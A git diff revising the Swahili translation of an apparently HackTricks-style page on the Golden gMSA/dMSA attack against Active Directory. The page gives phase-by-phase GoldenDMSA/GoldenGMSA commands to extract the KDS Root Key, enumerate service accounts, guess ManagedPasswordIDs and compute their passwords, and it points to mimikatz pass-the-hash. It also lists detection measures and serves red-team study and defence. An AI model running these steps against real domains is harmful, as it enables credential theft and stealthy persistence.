@@ -1,38 +1,38 @@
-# Golden gMSA/dMSA Attack (Utoaji wa Nenosiri za Managed Service Account Nje ya Mtandao)
+# Golden gMSA/dMSA Attack (Utoaji wa Nje ya Mfumo wa Password za Managed Service Account)
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## Muhtasari
 
-Windows Managed Service Accounts (MSA) ni principals maalum zilizoundwa kuendesha services bila kuhitaji kusimamia passwords zao manually.
-Kuna flavours mbili kuu:
+Windows Managed Service Accounts (MSA) ni principals maalum zilizoundwa kuendesha services bila hitaji la kusimamia password zao kwa mikono.
+Kuna flavours kuu mbili:
 
 1. **gMSA** – group Managed Service Account – inaweza kutumika kwenye hosts nyingi zilizoidhinishwa katika attribute yake ya `msDS-GroupMSAMembership`.
-2. **dMSA** – delegated Managed Service Account – mrithi wa gMSA aliye kwenye (preview), anayetegemea cryptography ileile lakini akiruhusu scenarios za delegation zenye granular zaidi.
+2. **dMSA** – delegated Managed Service Account – mrithi wa gMSA aliye katika (preview), anayetegemea cryptography ileile lakini akiruhusu scenarios za delegation zenye granular zaidi.
 
-Kwa variants zote mbili, **password haihifadhiwi** kwenye kila Domain Controller (DC) kama NT-hash ya kawaida. Badala yake, kila DC inaweza **kui-derive** password ya sasa wakati huo huo kutoka kwa:
+Kwa variants zote mbili, **password haihifadhiwi** kwenye kila Domain Controller (DC) kama NT-hash ya kawaida. Badala yake, kila DC inaweza **ku-derive** password ya sasa on-the-fly kutoka kwa:
 
-* **KDS Root Key** ya forest nzima (`KRBTGT\KDS`)  – secret yenye jina la GUID inayozalishwa randomly, na kusambazwa kwa kila DC chini ya container ya `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`.
+* **KDS Root Key** ya forest nzima (`KRBTGT\KDS`)  – secret yenye jina la GUID inayozalishwa randomly, na replicated kwa kila DC chini ya container ya `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`.
 * **SID** ya target account.
-* **ManagedPasswordID** (GUID) ya kila account, inayopatikana katika attribute ya `msDS-ManagedPasswordId`.
+* **ManagedPasswordID** (GUID) ya kila account inayopatikana kwenye attribute ya `msDS-ManagedPasswordId`.
 
-Utoaji ni: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → blob ya baiti 240 ambayo hatimaye **base64-encoded** na kuhifadhiwa katika attribute ya `msDS-ManagedPassword`.
-Hakuna Kerberos traffic au domain interaction inayohitajika wakati wa kawaida wa kutumia password – member host hui-derive password locally mradi inajua inputs hizo tatu.
+Derivation ni: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → blob yenye bytes 240 ambayo hatimaye **base64-encoded** na kuhifadhiwa kwenye attribute ya `msDS-ManagedPassword`.
+Hakuna Kerberos traffic au domain interaction inayohitajika wakati wa matumizi ya kawaida ya password – member host hu-derive password locally mradi tu inajua inputs hizo tatu.
 
 ## Golden gMSA / Golden dMSA Attack
 
-Ikiwa attacker anaweza kupata inputs zote tatu **offline**, anaweza ku-compute **passwords halali za sasa na zijazo** za gMSA/dMSA yoyote katika forest bila kuwasiliana tena na DC, akipita:<sup>[[1]](#references)[[2]](#references)</sup>
+Ikiwa attacker anaweza kupata inputs zote tatu **offline**, anaweza ku-compute **passwords halali za sasa na zijazo** kwa **gMSA/dMSA yoyote katika forest** bila kuwasiliana tena na DC, na hivyo kupita:<sup>[[1]](#references)[[2]](#references)</sup>
 
 * LDAP read auditing
-* Vipindi vya kubadilisha password (anaweza kuzi-pre-compute)
+* Vipindi vya password change (wanaweza ku-pre-compute)
 
-Hii inafanana na *Golden Ticket* ya service accounts.<sup>[[1]](#references)[[2]](#references)</sup>
+Hii ni sawa na *Golden Ticket* kwa service accounts.<sup>[[1]](#references)[[2]](#references)</sup>
 
 ### Mahitaji ya Awali
 
-1. **Forest-level compromise** ya **DC** moja (au Enterprise Admin), au access ya `SYSTEM` kwenye moja ya DCs katika forest.
+1. **Forest-level compromise** ya **DC moja** (au Enterprise Admin), au access ya `SYSTEM` kwenye mojawapo ya DCs katika forest.
 2. Uwezo wa ku-enumerate service accounts (LDAP read / RID brute-force).
-3. Workstation ya .NET ≥ 4.7.2 x64 ya kuendesha [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) au code inayolingana.
+3. Workstation ya .NET ≥ 4.7.2 x64 ya kuendesha [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) au code inayolingana.<sup>[[3]](#references)</sup>
 
 ### Golden gMSA / dMSA
 #### Phase 1 – Extract the KDS Root Key
@@ -53,9 +53,9 @@ GoldendMSA.exe kds
 # With GoldenGMSA
 GoldenGMSA.exe kdsinfo
 ```
-String ya base64 iliyoandikwa `RootKey` (jina la GUID) inahitajika katika hatua zinazofuata.<sup>[[1]](#references)[[2]](#references)</sup>
+Mfuatano wa base64 ulio na lebo `RootKey` (jina la GUID) unahitajika katika hatua zinazofuata.<sup>[[1]](#references)[[2]](#references)</sup>
 
-##### Phase 2 – Enumerate gMSA / dMSA objects
+##### Awamu ya 2 – Enumerate gMSA / dMSA objects
 
 Pata angalau `sAMAccountName`, `objectSid` na `msDS-ManagedPasswordId`:<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
@@ -65,7 +65,7 @@ Select sAMAccountName,objectSid,msDS-ManagedPasswordId
 
 GoldenGMSA.exe gmsainfo
 ```
-[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) hutekeleza modes za usaidizi:<sup>[[1]](#references)</sup>
+[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) hutekeleza modes za usaidizi:<sup>[[1]](#references)[[3]](#references)</sup>
 ```bash
 # LDAP enumeration (kerberos / simple bind)
 GoldendMSA.exe info -d example.local -m ldap
@@ -73,49 +73,49 @@ GoldendMSA.exe info -d example.local -m ldap
 # RID brute force if anonymous binds are blocked
 GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
 ```
-##### Phase 3 – Kukisia / Kugundua ManagedPasswordID (ikiwa haipo)
+##### Phase 3 – Kisia / Gundua ManagedPasswordID (inapokosekana)
 
-Baadhi ya deployments *huondoa* `msDS-ManagedPasswordId` wakati wa ACL-protected reads.  
-Kwa sababu GUID ina biti 128, naive bruteforce haiwezekani, lakini:
+Baadhi ya deployments *huondoa* `msDS-ManagedPasswordId` kwenye reads zilizolindwa na `ACL`.
+Kwa sababu GUID ina bits 128, naive bruteforce haiwezekani, lakini:
 
-1. Biti **32 za kwanza = Unix epoch time** ya kuundwa kwa account (kwa usahihi wa dakika).
-2. Ikifuatiwa na biti 96 za nasibu.
+1. **Bits 32 za kwanza = Unix epoch time** ya kuundwa kwa account (kwa usahihi wa dakika).
+2. Hufuatwa na bits 96 za nasibu.
 
-Kwa hivyo **wordlist finyu kwa kila account** (± saa chache) inawezekana.
+Kwa hiyo, **wordlist finyu kwa kila account** (± saa chache) inawezekana.
 ```bash
 GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
 ```
-Chombo hukokotoa nywila zinazoweza kuwa sahihi na kulinganisha blob yao ya base64 na attribute halisi ya `msDS-ManagedPassword` – ulinganifu huo hufichua GUID sahihi.
+Tool hukokotoa candidate passwords na kulinganisha base64 blob yake dhidi ya attribute halisi ya `msDS-ManagedPassword` – match hufichua GUID sahihi.
 
 ##### Phase 4 – Offline Password Computation & Conversion
 
-Baada ya ManagedPasswordID kujulikana, nywila sahihi inapatikana kwa command moja:<sup>[[1]](#references)[[2]](#references)</sup>
+Mara tu ManagedPasswordID inapojulikana, password halali inapatikana kwa command moja:<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
 # derive base64 password
 GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
 GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
 ```
-Hash zinazotokana zinaweza kuingizwa kwa **mimikatz** (`sekurlsa::pth`) au **Rubeus** kwa matumizi mabaya ya Kerberos, hivyo kuwezesha **lateral movement** na **persistence** kwa siri.
+Hashes zinazotokana zinaweza kuingizwa kwa kutumia **mimikatz** (`sekurlsa::pth`) au **Rubeus** kwa matumizi mabaya ya Kerberos, hivyo kuwezesha **lateral movement** na **persistence** kwa njia fiche.
 
-## Ugunduzi na Upunguzaji wa Hatari
+## Utambuzi na Kupunguza Athari
 
-* Zuia uwezo wa **DC backup and registry hive read** kwa wasimamizi wa Tier-0 pekee.
+* Zuia uwezo wa **DC backup and registry hive read** kwa administrators wa Tier-0 pekee.
 * Fuatilia uundaji wa **Directory Services Restore Mode (DSRM)** au **Volume Shadow Copy** kwenye DCs.
-* Kagua usomaji / mabadiliko ya `CN=Master Root Keys,…` na flags za `userAccountControl` za service accounts.
-* Tambua uandikaji usio wa kawaida wa password za **base64** au matumizi ya ghafla ya password ileile ya service kwenye hosts mbalimbali.
-* Fikiria kubadilisha gMSAs zenye privileges za juu kuwa **classic service accounts** zenye mabadiliko ya mara kwa mara ya random passwords pale ambapo Tier-0 isolation haiwezekani.
+* Kagua usomaji / mabadiliko kwenye `CN=Master Root Keys,…` na flags za `userAccountControl` za service accounts.
+* Tambua **base64 password writes** zisizo za kawaida au utumiaji wa tena wa service password kwa ghafla kwenye hosts mbalimbali.
+* Fikiria kubadilisha gMSAs zenye privileges za juu kuwa **classic service accounts** zenye rotations za kawaida na random pale ambapo kutenganisha Tier-0 hakuwezekani.
 
-## Zana
+## Tooling
 
 * [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – reference implementation iliyotumika kwenye ukurasa huu.<sup>[[3]](#references)</sup>
 * [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – reference implementation iliyotumika kwenye ukurasa huu.
 * [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
-* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket kwa kutumia AES keys zilizotokana.
+* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket kwa kutumia derived AES keys.
 
-## Marejeo
+## References
 
-- [1] [Golden dMSA – authentication bypass for delegated Managed Service Accounts](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
-- [2] [gMSA Active Directory Attacks Accounts](https://www.semperis.com/blog/golden-gmsa-attack/)
+- [1] [Golden dMSA – authentication bypass kwa Delegated Managed Service Accounts](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
+- [2] [Mashambulizi ya gMSA Active Directory Accounts](https://www.semperis.com/blog/golden-gmsa-attack/)
 - [3] [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)
 
 {{#include ../../banners/hacktricks-training.md}}
